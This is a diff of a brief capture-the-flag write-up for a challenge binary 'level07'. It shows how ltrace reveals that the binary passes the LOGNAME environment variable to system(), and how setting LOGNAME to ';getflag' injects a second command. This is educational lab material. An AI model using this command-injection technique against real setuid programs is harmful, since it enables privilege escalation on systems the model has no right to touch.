@@ -1,2 +1,5 @@
 We used ltrace on the executable "level07" and saw two interesting lines: getenv("LOGNAME") and system("/bin/echo level07")
-So we checked the value of LOGNAME and saw that it was level07, then we did: export LOGNAME=";getflag" and executed the binary
+So we checked the value of LOGNAME and saw that it was level07, then we did:
+
+$> export LOGNAME=";getflag"
+$> ./level07
